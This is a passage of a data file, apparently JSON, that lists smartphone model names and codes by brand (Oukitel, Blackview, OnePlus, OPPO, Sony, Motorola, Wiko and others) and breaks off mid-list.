"Oukitel": ["Oukitel_C12","Oukitel_C12_Pro","Oukitel_C13","Oukitel_C15","Oukitel_C15_Pro","Oukitel_C16","Oukitel_C17","Oukitel_C18","Oukitel_C19","Oukitel_C20","Oukitel_C21","Oukitel_C22","Oukitel_C23","Oukitel_C24","Oukitel_C25","Oukitel_C26","Oukitel_C28","Oukitel_K3","Oukitel_K3_Pro","Oukitel_K5","Oukitel_K5_Pro","Oukitel_K6","Oukitel_K6_Pro","Oukitel_K7","Oukitel_K7_Pro","Oukitel_K8","Oukitel_K8_Pro","Oukitel_K9","Oukitel_K10","Oukitel_K10_Pro","Oukitel_K12","Oukitel_K12_Pro","Oukitel_K13","Oukitel_K13_Pro","Oukitel_K15","Oukitel_K15_Pro","Oukitel_K16","Oukitel_K16_Pro","Oukitel_K17","Oukitel_K17_Pro","Oukitel_K18","Oukitel_K18_Pro","Oukitel_K19","Oukitel_K19_Pro","Oukitel_K20","Oukitel_K20_Pro","Oukitel_K21","Oukitel_K21_Pro","Oukitel_K22","Oukitel_K22_Pro","Oukitel_K23","Oukitel_K23_Pro","Oukitel_K25","Oukitel_K25_Pro","Oukitel_K1000","Oukitel_K10000","Oukitel_K10000_Pro","Oukitel_K10000_Max","Oukitel_K4000","Oukitel_K4000_Pro","Oukitel_K5000","Oukitel_K5000_Pro","Oukitel_K6000","Oukitel_K6000_Pro","Oukitel_WP1","Oukitel_WP2","Oukitel_WP3","Oukitel_WP3_Pro","Oukitel_WP5","Oukitel_WP6","Oukitel_WP7","Oukitel_WP8","Oukitel_WP9","Oukitel_WP10","Oukitel_WP11","Oukitel_WP12","Oukitel_WP13","Oukitel_WP14","Oukitel_WP15","Oukitel_WP16","Oukitel_WP17","Oukitel_WP18","Oukitel_WP19","Oukitel_WP20","Oukitel_WP21","Oukitel_WP22","Oukitel_WP23","Oukitel_WP26","Oukitel_WP27","Oukitel_WP28","Oukitel_WP30","Oukitel_U16","Oukitel_U18","Oukitel_U19","Oukitel_U20","Oukitel_U23","Oukitel_U25","Oukitel_U27","Oukitel_U28","Oukitel_U30","Oukitel_U31","Oukitel_U32","Oukitel_U33","Oukitel_U35","Oukitel_U36","Oukitel_U37","Oukitel_U38","Oukitel_U39","Oukitel_U40","Oukitel_U41","Oukitel_U42","Oukitel_U43","Oukitel_U44","Oukitel_U45","Oukitel_Y4800","Oukitel_Y4800_Plus"],
"Blackview": ["Blackview_A7","Blackview_A7_Pro","Blackview_A8","Blackview_A8_Pro","Blackview_A9","Blackview_A9_Pro","Blackview_A10","Blackview_A10_Pro","Blackview_A20","Blackview_A20_Pro","Blackview_A30","Blackview_A30_Pro","Blackview_A40","Blackview_A40_Pro","Blackview_A60","Blackview_A60_Pro","Blackview_A70","Blackview_A70_Pro","Blackview_A80","Blackview_A80_Pro","Blackview_A90","Blackview_A90_Pro","Blackview_BV1000","Blackview_BV1000_Pro","Blackview_BV2000","Blackview_BV2000_Pro","Blackview_BV3000","Blackview_BV3000_Pro","Blackview_BV4000","Blackview_BV4000_Pro","Blackview_BV5000","Blackview_BV5000_Pro","Blackview_BV6000","Blackview_BV6000_Pro","Blackview_BV7000","Blackview_BV7000_Pro","Blackview_BV8000","Blackview_BV8000_Pro","Blackview_BV9000","Blackview_BV9000_Pro","Blackview_BV9500","Blackview_BV9500_Pro","Blackview_BV9600","Blackview_BV9600_Pro","Blackview_BV9700","Blackview_BV9700_Pro","Blackview_BV9800","Blackview_BV9800_Pro","Blackview_BV9900","Blackview_BV9900_Pro","Blackview_BV100","Blackview_BV200","Blackview_BV300","Blackview_BV400","Blackview_BV500","Blackview_BV600","Blackview_BV700","Blackview_BV7100","Blackview_BV7200","Blackview_BV7300","Blackview_BV7500","Blackview_BV7600","Blackview_BV7700","Blackview_BV7800","Blackview_BV7900","Blackview_BV800","Blackview_BV900","Blackview_BV950","Blackview_BV960","Blackview_BV980","Blackview_BV990","Blackview_BV1000_Pro_Max","Blackview_BV2000_Pro_Max","Blackview_BV6000_Pro_X","Blackview_BV7000_Pro_X","Blackview_BV9000_Pro_X"],
"Ulefone": ["Ulefone_Armor","Ulefone_Armor_2","Ulefone_Armor_2_Pro","Ulefone_Armor_3","Ulefone_Armor_3T","Ulefone_Armor_3W","Ulefone_Armor_5","Ulefone_Armor_6","Ulefone_Armor_7","Ulefone_Armor_7E","Ulefone_Armor_8","Ulefone_Armor_9","Ulefone_Armor_10","Ulefone_Armor_X7","Ulefone_Armor_X8","Ulefone_Armor_X9","Ulefone_Armor_X10","Ulefone_Note","Ulefone_Note_3","Ulefone_Note_7","Ulefone_Note_7P","Ulefone_Note_8","Ulefone_Note_8P","Ulefone_Note_9","Ulefone_Note_9P","Ulefone_Note_10","Ulefone_Note_10P","Ulefone_Power","Ulefone_Power_2","Ulefone_Power_3","Ulefone_Power_3S","Ulefone_Power_5","Ulefone_Power_6","Ulefone_Power_7","Ulefone_Power_7T","Ulefone_Sigma","Ulefone_Sigma_Pro","Ulefone_Sigma_2","Ulefone_T1","Ulefone_T2","Ulefone_T2_Pro","Ulefone_T3","Ulefone_T3_Pro","Ulefone_T5","Ulefone_T5_Pro","Ulefone_T7","Ulefone_T7_Pro","Ulefone_Smart","Ulefone_X"],
"AGM": ["AGM_A10","AGM_A8","AGM_A8_SE","AGM_G1_PRO","AGM_G1S","AGM_G2","AGM_G2_PRO","AGM_G2_GUARDIAN","AGM_G3","AGM_G3_PRO","AGM_Glory","AGM_Glory_PRO","AGM_Glory_G1S","AGM_Glory_SE","AGM_H3","AGM_H5","AGM_H5_PRO","AGM_H6","AGM_H6_LITE","AGM_H_MAX","AGM_M1","AGM_M5","AGM_M6","AGM_M7","AGM_M8_FLIP","AGM_M9","AGM_M10","AGM_X1_Mini","AGM_X2","AGM_X5","AGM_X6_Phantom","AGM_N1","AGM_PAD_P1","AGM_PAD_P2_Active","AGM_Legion","AGM_Legion_Pro"],
"Leagoo": ["KIICAA_Mix","KIICAA_Power","Lead_3","Lead_3S","M5","M5_Plus","M7","M8","M8_Pro","M9","M9_Pro","M10","M10_Plus","M10_Pro","M11","M12","M13","P1","P1_Pro","Power_2","Power_2_Pro","Power_5","S8","S8_Pro","S9","S10","S11","S12","T1","T5","T5c","T8s","T10","Venture_1","XRover_C","Z5","Z6","Z7"],
"Elephone": ["A1","A2","A3","A4","A4_Pro","A5","A5_Lite","A6","A6_Max","A6_Mini","A6_Pro","A7","A7H","A8","C1","C1_Mini","C8","E10","E10_Pro","Fighter_2","G7","M2","M3","P8_3D","P8_Max","P11","P11_Max","P11_Max_S","P60","P8000","P9000","P9000_Lite","P9000_Edge","PlayX","PX","PX_Mini","PX_Pro","R9","S1","S2","S3","S7","S8","S8_Pro","S9","Soldier","SX","U","U_Pro","U2","U2_Pro","U3","U3H","U5","V1","Vowney","Vowney_Lite","W3","X3","Z1"],
"HomTom": ["C1","C2","C8","C9","C13","H1","H3","H5","H10","HT7","HT16S","HT20_Pro","HT27","HT30","HT37","HT37_Pro","HT50","HT70","P1","P30_Pro","S7","S8","S9_Plus","S12","S16","S17","S77","S88","S99","S99i","Z8","Zoji_Z9","Zoji_Z11","Z33"],
"Vernee": ["Active","Apollo","Apollo_Lite","Apollo_X","Mars","Mars_Pro","M5","M5_Note","Mix_2","T3_Pro","Thor","Thor_E","Thor_Plus","V2","V2_Pro","X"],
"VKworld": ["Discovery_S1","Discovery_S2","Mix","Mix_Plus","NewStone_V3","S8","S8_Plus","Stone_V3","T1_Plus","T2","T3","VK560","VK560X","VK6050S","VK700","VK7000","VK700X","VK800","VK800X","VK810","VK815","VK815_Max","VK815_Pro","VK900","VK960","VK960S"],
"UMIDIGI": ["A1","A1_Pro","A3","A3_Pro","A5","A7","A7_Pro","A9","A9_Pro","A11","A11_Pro","A11_Max","A13","A13_Pro","A15","A15_Pro","Bison","Bison_GT","Bison_GT2","Bison_Pro","Bison_X10","Bison_X10_Pro","Bison_X20","Bison_X20_Pro","Bison_X20G","C_Note","Crystal","F1","F1_Play","F2","F3","G1","G3","G5","G9","One","One_Max","One_Pro","Power","Power_3","S2","S2_Lite","S3_Pro","S5_Pro","S5_Pro_GS","Z1","Z1_Pro","Z2","Z2_Pro","Z2_SE"],
"IIIF150": ["Air_1","Air_1_Pro","Air_1_Ultra","B1","B2","B2_Pro","H2022","R2022","R2023"],
"Hotwav": ["Cyber_7","Cyber_9","Cyber_13","Cyber_X","Cyber_X_Lite","Cyber_X_Pro","Cyber_XR","Hot_6","Hot_8","Hot_9","Note_12","Note_12_Pro","Note_13","Note_13_Pro","Note_20","Note_20_Pro","Pearl_K1","Pearl_K2","Pearl_K3","Pearl_K4","Pearl_K5","Pearl_K6","Pearl_K7","Pearl_K8","Pearl_K9","R6","R7","R9","R9_Plus","R9_Pro","Symbol_X","Symbol_X_Pro","Symbol_XR","T5","T6","T7","T7_Pro","Venus_R8","Venus_R9","W10","W10_Pro","W20","W30","W30_Pro"],
"OnePlus": ["A0001","A1001","A2001","A2003","A3000","A3003","A3010","A5000","A5010","A6000","A6003","A6010","A6013","A6020","A6023","A7000","A7003","A7010","A7013","A8000","A8003","A8010","A8013","A9000","A9003","A9010","A9013","A9020","A9030","A9033","CPH_2451","CPH_2487","CPH_2551","CPH_2573","CPH_2581","CPH_2585","DE2117","DE2118","DE2119","DE2120","EB2101","EB2103","GM1900","GM1901","GM1903","GM1905","GM1910","GM1911","GM1913","GM1915","GM1917","GM1920","GM1925","GM1930","GM1931","GM1933","GM1935","GM1940","GM1942","GM1943","GM1945","GM1950","GM1953","GM1955","GM1957","GM1960","GM1961","GM1963","GM1965","GM1970","GM1973","GM1975","GM1977","HD1900","HD1901","HD1903","HD1905","HD1910","HD1911","HD1913","HD1915","HD1920","HD1921","HD1923","HD1925","HD1930","HD1933","HD1935","HD1941","HD1943","HD1945","HD1950","HD1953","HD1955","HD1957","HD1960","HD1961","HD1963","HD1965","HD1970","HD1973","HD1975","HD1977","IN2010","IN2011","IN2013","IN2015","IN2020","IN2021","IN2023","IN2025","KB2000","KB2001","KB2003","KB2005","KB2007","LE2100","LE2101","LE2103","LE2105","LE2110","LE2111","LE2113","LE2115","NE2210","NE2211","NE2213","NE2215","PJ110","PJ1100","PGKM10","PGKM11"],
"OPPO": ["CPH_1605","CPH_1607","CPH_1609","CPH_1611","CPH_1613","CPH_1701","CPH_1707","CPH_1709","CPH_1715","CPH_1717","CPH_1723","CPH_1725","CPH_1801","CPH_1803","CPH_1805","CPH_1809","CPH_1819","CPH_1823","CPH_1825","CPH_1831","CPH_1835","CPH_1837","CPH_1851","CPH_1853","CPH_1859","CPH_1871","CPH_1875","CPH_1879","CPH_1901","CPH_1903","CPH_1905","CPH_1907","CPH_1911","CPH_1917","CPH_1919","CPH_1920","CPH_1931","CPH_1933","CPH_1937","CPH_1941","CPH_1943","CPH_1945","CPH_1951","CPH_1955","CPH_1969","CPH_1979","CPH_1983","CPH_2001","CPH_2005","CPH_2009","CPH_2013","CPH_2015","CPH_2021","CPH_2023","CPH_2025","CPH_2035","CPH_2043","CPH_2059","CPH_2061","CPH_2067","CPH_2069","CPH_2071","CPH_2083","CPH_2091","CPH_2095","CPH_2099","CPH_2101","CPH_2103","CPH_2113","CPH_2127","CPH_2131","CPH_2145","CPH_2159","CPH_2179","CPH_2185","CPH_2195","CPH_2201","CPH_2205","CPH_2211","CPH_2219","CPH_2239","CPH_2247","CPH_2251","CPH_2263","CPH_2271","CPH_2285","CPH_2301","CPH_2305","CPH_2311","CPH_2321","CPH_2333","CPH_2349","CPH_2357","CPH_2371","CPH_2389","CPH_2399","CPH_2401","CPH_2407","CPH_2413","CPH_2423","CPH_2431","CPH_2449","CPH_2457","CPH_2463","CPH_2471","CPH_2485","CPH_2499","CPH_2501","CPH_2505","CPH_2511","CPH_2521","CPH_2531","PDEM_10","PDEM_20","PEAM_00","PEAM_10","PEAM_11","PEG_00","PEG_01","PEG_10","PEG_11","PFAM_10","PFAM_11","PFTM20","PFTM21","PGEM_10","PGEM_11","PGEM_20","PGJM_10","PGKM_10","PJGM_10","PJHM_10"],
"Infinix": ["X401","X403","X404","X407","X450","X454","X501","X507","X510","X517","X521","X522","X523","X551","X552","X554","X559","X570","X571","X572","X573","X573B","X600","X601","X602","X603","X604","X604B","X605","X605B","X608","X610","X610B","X612","X613","X615","X616","X620","X621","X622","X623","X624","X625","X625B","X625C","X625D","X626","X626B","X627","X627W","X628","X629","X630","X632","X650","X651","X652","X652A","X652B","X652C","X653","X654","X655","X655C","X655D","X655F","X657","X658","X658B","X658C","X658E","X659","X659B","X660","X660B","X660C","X661","X662","X662B","X663","X663B","X663C","X664","X665","X665B","X666","X666B","X668","X669","X669C","X670","X671","X6710","X6711","X6716","X6716B","X672","X673","X6739","X675","X676","X678","X680","X680B","X680C","X680D","X680E","X680F","X6810","X6811","X6812","X6812B","X6812C","X6813","X6815","X6815C","X6816","X6816C","X6816D","X6817","X6817B","X6820","X6821","X6823","X6825","X6826","X6826B","X6826C","X6827","X6828","X6830","X6831","X6832","X6833","X6833B","X6834","X6835","X6835B","X6836","X6837","X6838","X6840","X6841","X6850","X6850B","X6851","X6851B","X6852","X6853","X6855","X6860","X6870","X6871","X6880","X6890","X690","X690B","X690C","X691","X692","X693","X694","X695","X695C","X695D","X696","X697","X698","X699","X701","X702","X703","X705","X710","X715","X720","X725","X730","X735","X740","X745","X750","X760","X765"],
"Lenovo": ["A1000","A1010a20","A2010","A2020","A269","A288t","A3000","A316","A319","A328","A3300","A336","A369i","A390","A5000","A516","A526","A536","A6000","A6000_Plus","A6010","A606","A628t","A630","A656","A658t","A660","A670t","A680","A7000","A706","A708t","A750","A760","A766","A789","A800","A820","A830","A850","A858","A880","K3","K3_Note","K4_Note","K5","K5_Note","K6","K6_Note","K8","K8_Note","K9","K9_Note","K10_Note","K12_Note","K50_T3","K50_T5","K51c78","K52e78","K53a48","K53b36","L78011","L78031","L78121","P1","P1a42","P2","P2a42","S60","S650","S660","S720","S750","S820","S850","S860","S880","S890","S920","S930","S939","S960","Vibe_C","Vibe_P1","Vibe_P1m","Vibe_S1","Vibe_S1_Lite","Vibe_Shot","Vibe_X","Vibe_X2","Vibe_X3","Z1","Z2","Z2_Plus","Z90"],
"Google": ["G-2PW4100","G-2PW4200","G-2PW4300","G-2PW4400","G-2PW4900","G-2PW5000","G-2PW5100","G-2PW5200","G-2PW5300","G-2PW5400","G-2PW5500","G-2PW5600","G-2PW5700","G-2PW5800","G-2PW5900","G-2PW6100","G-2PW6200","G-2PW6300","G-2PW6400","G-2PW6500","G-2PW6600","G-2PW6700","G-2PW6800","G-2PW6900","G-2PW7000","G-2PW7100","G-2PW7200","G-2PW7300","G-2PW7400","G-2PW7500","G-2PW7600","G-2PW7700","G-2PW7800","G-2PW7900","G-2PW8000","G-2PW8100","G-2PW8200","G-2PW8300","G-2PW8400","G-2PW8500","G-2PW8600","G-2PW8700","G-2PW8800","G-2PW8900","G-2PW9000","G-2PW9100","G-2PW9200","G-2PW9300","G-2PW9400","G-2PW9500","G-2PW9600","G-2PW9700","G-2PW9800","G-2PW9900","G-2PW10000","LG-D820","LG-D821","LG-D850","LG-D851","LG-D852","LG-D855","LG-H790","LG-H791","LG-H798","LG-H810","LG-H811","LG-H815","LG-H818","LG-H819","MOB30H","MOB30K","MOB31E","MOB31H","MOB31K","MOB31T","MOB31Z","NEXUS-ONE","SM-G900F-GOOGLE"],
"Amazon": ["SD4930UR","SD4930URB"],
"Sony": ["C1504","C1505","C1604","C1605","C1904","C1905","C2004","C2005","C2104","C2105","D2004","D2005","D2104","D2105","D2202","D2203","D2206","D2243","D2302","D2303","D2305","D2306","D2403","D2406","D2533","D5102","D5103","D5303","D5306","D5316","D5322","D5503","D5803","D5833","D6502","D6503","D6543","D6603","D6616","D6633","D6643","D6653","D6683","E2003","E2033","E2043","E2053","E2104","E2105","E2115","E2124","E2125","E2133","E2303","E2306","E2312","E2333","E2353","E5303","E5333","E5343","E5353","E5506","E5533","E5553","E5603","E5633","F3111","F3113","F3115","F3116","F5121","F5122","F8131","F8132","G3112","G3116","G3121","G3123","G3125","G3212","G3221","G3223","G3226","G3311","G3312","G3313","G3412","G3421","G3423","G3426","G8141","G8142","G8188","H3113","H3123","H3133","H3213","H3223","H3311","H3321","H3413","H4113","H4133","H4213","H4233","H4311","H4331","H4413","H4493","H8216","H8266","H8276","H8296","H8314","H8324","H8416","H9436","I3113","I3123","I3213","I3223","I3312","I4113","I4193","I4213","I4293","I4312","I4332","I4412","I4493","J8110","J8170","J8210","J8270","J9110","J9150","SO-01K","SO-01L","SO-02K","SO-02L","SO-03J","SO-03K","SO-04H","SO-04J","SO-04K","SO-05G","SO-05K","SOG01","SOG02","SOG03","SOG04","SOG05","XQ-AD51","XQ-AD52","XQ-AT51","XQ-AT52","XQ-AS52","XQ-AU51","XQ-AU52","XQ-BC52","XQ-BE52","XQ-BQ52","XQ-BT52","XQ-CC54","XQ-CQ54","XQ-CT54","XQ-DQ44","XQ-DQ54","XQ-DQ72","XQ-EC44","XQ-EC54","XQ-ES54","XQ-FQ44","XQ-FQ54","XQ-FQ62","XQ-FQ72","XQ-GQ44","XQ-GQ54","XQ-GQ62","XQ-GQ72"],
"Realme": ["RMX1801","RMX1803","RMX1821","RMX1822","RMX1831","RMX1851","RMX1901","RMX1911","RMX1921","RMX1941","RMX1945","RMX1971","RMX1991","RMX1992","RMX2001","RMX2020","RMX2025","RMX2030","RMX2040","RMX2041","RMX2050","RMX2061","RMX2071","RMX2081","RMX2085","RMX2101","RMX2103","RMX2111","RMX2121","RMX2144","RMX2151","RMX2161","RMX2170","RMX2180","RMX2191","RMX2193","RMX2200","RMX2202","RMX2205","RMX2211","RMX2221","RMX2231","RMX2241","RMX2251","RMX2261","RMX2271","RMX2280","RMX2290","RMX2301","RMX2311","RMX2321","RMX2331","RMX2341","RMX2351","RMX2361","RMX2371","RMX2381","RMX2391","RMX2401","RMX2411","RMX2421","RMX2431","RMX2441","RMX2451","RMX2461","RMX2471","RMX2481","RMX2491","RMX2501","RMX2511","RMX2521","RMX2531","RMX2541","RMX2551","RMX2561","RMX2571","RMX2581","RMX2591","RMX2601","RMX2611","RMX2621","RMX2631","RMX2641","RMX2651","RMX2661","RMX2671","RMX2681","RMX2691","RMX2701","RMX2711","RMX2721","RMX2731","RMX2741","RMX2751","RMX2761","RMX2771","RMX2781","RMX2791","RMX2801","RMX2811","RMX2821","RMX2831","RMX2841","RMX2851","RMX2861","RMX2871","RMX2881","RMX2891","RMX3031","RMX3081","RMX3092","RMX3121","RMX3151","RMX3191","RMX3201","RMX3241","RMX3261","RMX3286","RMX3301","RMX3370","RMX3371","RMX3461","RMX3471","RMX3511","RMX3572","RMX3630","RMX3686","RMX3706","RMX3741","RMX3751","RMX3771","RMX3801","RMX3821","RMX3861"],
"Huawei": ["ALE_L21","ANE_LX1","ANE_LX2","ANE_LX3","ART_L29","ATU_L21","BAC_L21","BKL_L04","BKL_L09","BND_L21","CLT_L09","CLT_L29","COL_L10","COL_L29","CRO_L02","DLI_L22","DRA_LX5","DUB_LX1","DUB_LX2","DUB_LX3","EVA_L09","EVA_L19","EVR_L29","FIG_LX1","FIG_LX2","FIG_LX3","FRD_L09","FRD_L19","HMA_L09","HMA_L29","HUAWEI_G6_L11","HUAWEI_G7_L01","HUAWEI_G8","INE_LX1","INE_LX2","JAT_L29","JNY_LX1","KNT_AL10","KOB_L09","LDN_L21","LDN_LX3","LIO_L09","LIO_L29","LYA_L09","LYA_L29","MAR_LX1","MAR_LX2","MED_LX9","MHA_L09","MHA_L29","MYA_L11","MYA_L22","NAM_LX9","NOH_NX9","NXT_L09","NXT_L29","OXF_AN10","PAR_LX1","PAR_LX9","PCT_L29","POT_LX1","PRA_LA1","RNE_L21","SEA_AL10","SHT_W09","SLA_L22","STK_L21","TAG_L21","TAS_AL00","VNS_L21","VOG_L29","VKY_L09","WAS_LX1","WLZ_AN00","YAL_L21","YAL_L41","YAL_L61","YAL_L71","Y6_2017","Y6_2018","Y6_2019","Y7_2017","Y7_2018","Y7_2019","Y9_2018","Y9_2019"],
"LG": ["LG_D320","LG_D321","LG_D325","LG_D331","LG_D335","LG_D337","LG_D340","LG_D373","LG_D390","LG_D405","LG_D410","LG_D415","LG_D500","LG_D505","LG_D510","LG_D520","LG_D525","LG_D600","LG_D605","LG_D610","LG_D620","LG_D625","LG_D680","LG_D682","LG_D690","LG_E400","LG_E410","LG_E412","LG_E425","LG_E435","LG_E440","LG_E455","LG_E460","LG_E465","LG_E610","LG_E612","LG_E615","LG_E617","LG_E960","LG_F100","LG_F160","LG_F180","LG_F200","LG_F240","LG_G2","LG_G3","LG_G4","LG_G5","LG_G6","LG_G7","LG_G8","LG_H320","LG_H340","LG_H410","LG_H415","LG_H420","LG_H422","LG_H440","LG_H442","LG_H500","LG_H502","LG_H510","LG_H525","LG_H540","LG_H542","LG_H630","LG_H631","LG_H635","LG_H650","LG_H652","LG_H700","LG_H735","LG_H740","LG_H790","LG_H815","LG_H818","LG_H820","LG_H830","LG_H840","LG_H850","LG_H860","LG_H870","LG_H871","LG_H872","LG_H873","LG_H910","LG_H915","LG_H918","LG_H930","LG_H931","LG_H932","LG_H933","LG_H960","LG_H961","LG_H962","LG_H964","LG_H990","LG_K100","LG_K120","LG_K130","LG_K200","LG_K210","LG_K220","LG_K350","LG_K371","LG_K410","LG_K420","LG_K430","LG_K500","LG_K510","LG_K520","LG_K530","LG_K535","LG_K550","LG_K557","LG_K580","LG_K600","LG_K630","LG_K650","LG_K700","LG_K710","LG_K720","LG_K750","LG_K760","LG_K770","LG_K780","LG_K900","LG_LS660","LG_LS676","LG_LS777","LG_LS840","LG_LS993","LG_M150","LG_M160","LG_M200","LG_M210","LG_M250","LG_M257","LG_M320","LG_M327","LG_M400","LG_M700","LG_MS210","LG_MS345","LG_P350","LG_P500","LG_P503","LG_P700","LG_P705","LG_P710","LG_P713","LG_P715","LG_P720","LG_P760","LG_P765","LG_P768","LG_P769","LG_P880","LG_P895","LG_Q610","LG_Q617","LG_Q630","LG_Q710","LG_Q720","LG_Q725","LG_Q730","LG_Q815","LG_Q850","LG_Q925","LG_Q920","LG_Q900","LG_Q92","LG_Q7","LG_Q8","LG_Q9","LG_SP200","LG_SP320","LG_US215","LG_US601","LG_US610","LG_US630","LG_US700","LG_US730","LG_US760","LG_US780","LG_US800","LG_US900","LM_G710","LM_G820","LM_G850","LM_G900","LM_G910","LM_G910N","LM_K200","LM_K300","LM_K410","LM_K420","LM_K500","LM_K525","LM_K600","LM_K630","LM_K730","LM_K920","LM_Q610","LM_Q617","LM_Q630","LM_Q710","LM_Q720","LM_Q725","LM_Q730","LM_Q815","LM_Q850","LM_Q920","LM_Q925","LM_V350","LM_V400","LM_V405","LM_V410","LM_V500","LM_V510","LM_V600","LM_V700","LM_V900"],
"Nokia": ["TA_1000","TA_1003","TA_1004","TA_1012","TA_1017","TA_1021","TA_1024","TA_1025","TA_1027","TA_1028","TA_1032","TA_1037","TA_1043","TA_1049","TA_1050","TA_1053","TA_1054","TA_1057","TA_1059","TA_1062","TA_1063","TA_1068","TA_1074","TA_1080","TA_1087","TA_1094","TA_1097","TA_1099","TA_1100","TA_1103","TA_1106","TA_1109","TA_1112","TA_1119","TA_1120","TA_1131","TA_1140","TA_1141","TA_1143","TA_1146","TA_1147","TA_1152","TA_1161","TA_1164","TA_1172","TA_1178","TA_1182","TA_1183","TA_1187","TA_1193","TA_1203","TA_1204","TA_1212","TA_1218","TA_1220","TA_1234","TA_1235","TA_1237","TA_1240","TA_1254","TA_1270","TA_1277","TA_1294","TA_1295","TA_1299","TA_1304","TA_1316","TA_1324","TA_1325","TA_1330","TA_1333","TA_1337","TA_1340","TA_1347","TA_1350","TA_1352","TA_1362","TA_1365","TA_1372","TA_1378","TA_1380","TA_1388","TA_1390","TA_1396","TA_1402","TA_1403","TA_1413","TA_1418","TA_1422","TA_1434","TA_1447","TA_1450","TA_1460","TA_1469","TA_1476","TA_1480","TA_1483","TA_1492","TA_1502","TA_1506","TA_1510","TA_1515","TA_1520","TA_1528","TA_1532","TA_1543","TA_1550","TA_1556","TA_1560","TA_1567","TA_1570","TA_1573","TA_1585","TA_1590","TA_1600","TA_1607","TA_1612","TA_1624","TA_1650","TA_1654","TA_1661","TA_1681","TA_1685","TA_1701","TA_1702","TA_1705","TA_1710"],
"Lava": ["A1","A3","A5","A7","A9","A10","A11","A44","A48","A50","A51","A52","A55","A57","A59","A60","A61","A63","A67","A68","A71","A72","A73","A76","A77","A82","A88","A89","A93","AGNI_5G","AGNI_2_5G","BLAZE","BLAZE_1X_5G","BLAZE_2_5G","BLAZE_5G","BLAZE_CURVE_5G","BLAZE_NXT","BLAZE_PRO","BLAZE_X","IRIS_300","IRIS_350","IRIS_401","IRIS_402","IRIS_404","IRIS_406","IRIS_410","IRIS_430","IRIS_450","IRIS_455","IRIS_458Q","IRIS_460","IRIS_465","IRIS_470","IRIS_501","IRIS_502","IRIS_503","IRIS_504Q","IRIS_505","IRIS_506Q","IRIS_550Q","IRIS_560","IRIS_565","IRIS_600","IRIS_700","IRIS_708","IRIS_800","IRIS_820","IRIS_830","IRIS_840","IRIS_X1","IRIS_X5","IRIS_X8","IRIS_X9","IRIS_X10","IRIS_X11","IRIS_X50","IRIS_X60","IRIS_X80","PIXEL_V1","PIXEL_V2","PIXEL_V2_PLUS","PIXEL_V3","PIXEL_V3_PLUS","PIXEL_V4","STORM_3G","STORM_5G","STORM_PLAY","STORM_SELFIE","X3","X38","X41","X50","X80","X81","X90","X90_PLUS","YUVA","YUVA_2","YUVA_3","YUVA_GO","YUVA_PRO","YUVA_SMART","YUVA_STAR","YUVY_X","YUVY_X2","Z1","Z2","Z2S","Z3","Z4","Z6","Z10","Z25","Z50","Z52_PRO","Z60","Z61","Z61_PRO","Z66","Z66_PRO","Z70","Z71","Z80","Z81","Z82","Z90","Z91","Z91_PRO","Z92","Z92_PRO","Z93","Z93_PRO","Z99"],
"Motorola": ["XT300","XT301","XT311","XT316","XT319","XT320","XT321","XT389","XT390","XT502","XT503","XT504","XT505","XT506","XT507","XT508","XT509","XT510","XT511","XT512","XT530","XT531","XT532","XT535","XT536","XT610","XT615","XT621","XT622","XT626","XT627","XT631","XT701","XT702","XT711","XT720","XT800","XT806","XT860","XT875","XT876","XT882","XT890","XT894","XT897","XT900","XT901","XT910","XT912","XT915","XT918","XT920","XT925","XT926","XT928","XT1021","XT1022","XT1023","XT1025","XT1028","XT1030","XT1031","XT1032","XT1033","XT1034","XT1039","XT1040","XT1042","XT1045","XT1050","XT1052","XT1053","XT1055","XT1056","XT1060","XT1063","XT1064","XT1068","XT1072","XT1077","XT1080","XT1085","XT1087","XT1092","XT1095","XT1097","XT1200","XT1225","XT1228","XT1230","XT1234","XT1240","XT1250","XT1254","XT1257","XT1259","XT1261","XT1521","XT1524","XT1526","XT1528","XT1540","XT1541","XT1542","XT1543","XT1544","XT1562","XT1563","XT1565","XT1570","XT1572","XT1580","XT1581","XT1585","XT1600","XT1601","XT1602","XT1603","XT1604","XT1607","XT1635","XT1635_01","XT1635_02","XT1650","XT1651","XT1652","XT1653","XT1662","XT1663","XT1664","XT1665","XT1666","XT1670","XT1671","XT1672","XT1675","XT1680","XT1681","XT1683","XT1684","XT1685","XT1687","XT1688","XT1690","XT1691","XT1692","XT1700","XT1706","XT1710","XT1715","XT1719","XT1721","XT1723","XT1726","XT1729","XT1730","XT1731","XT1732","XT1750","XT1754","XT1755","XT1760","XT1761","XT1762","XT1763","XT1770","XT1771","XT1772","XT1773","XT1780","XT1789","XT1790","XT1799","XT1800","XT1801","XT1803","XT1805","XT1806","XT1807","XT1808","XT1810","XT1811","XT1812","XT1813","XT1814","XT1815","XT1900","XT1902","XT1903","XT1905","XT1907","XT1910","XT1912","XT1913","XT1914","XT1916","XT1920","XT1922","XT1924","XT1925","XT1926","XT1927","XT1931","XT1941","XT1942","XT1943","XT1944","XT1952","XT1955","XT1956","XT1957","XT1962","XT1965","XT1969","XT1970","XT1971","XT1973","XT1976","XT1980","XT1989","XT1990","XT1991","XT1992","XT2001","XT2003","XT2005","XT2010","XT2013","XT2017","XT2041","XT2043","XT2045","XT2052","XT2053","XT2063","XT2071","XT2073","XT2075","XT2091","XT2093","XT2095","XT2105","XT2125","XT2131","XT2141","XT2151","XT2161","XT2171","XT2173","XT2183","XT2201","XT2203","XT2211","XT2221","XT2231","XT2241","XT2251","XT2271","XT2283","XT2301","XT2311","XT2321","XT2331","XT2341","XT2345","XT2401","XT2411","XT2421","XT2431","XT2445","XT2450","XT2463","XT2471","XT2483","XT2503","XT2521"],
"Wiko": ["W_A050","W_A080","W_A090","W_A100","W_A101","W_A102","W_A110","W_A120","W_A130","W_A140","W_A150","W_B1500","W_B1600","W_B1700","W_B1800","W_B1820","W_B1900","W_B2000","W_B2200","W_B2300","W_B2400","W_B2420","W_B2460","W_C080","W_C090","W_C100","W_C101","W_C110","W_C120","W_C150","W_C200","W_C200SN","W_C201","W_C210","W_C220","W_C250","W_C300","W_C300SN","W_C400","W_C500","W_C700","W_C800","W_C800S","W_C860","W_K080","W_K090","W_K100","W_K101","W_K110","W_K120","W_K130","W_K150","W_K200","W_K210","W_K220","W_K250","W_K300","W_K320","W_K350","W_K380","W_K390","W_K400","W_K410","W_K420","W_K450","W_K500","W_K510","W_K520","W_K540","W_K550","W_K560","W_K580","W_K600","W_K610","W_K620","W_K630","W_P080","W_P090","W_P100","W_P110","W_P120","W_P130","W_P150","W_P180","W_P200","W_P200CM","W_P210","W_P220","W_P250","W_P300","W_P311","W_P400","W_P500","W_P600","W_P611","W_P611_128","W_V450","W_V500","W_V550","W_V600","W_V620","W_V650","W_V670","W_V680","W_V700","W_V710","W_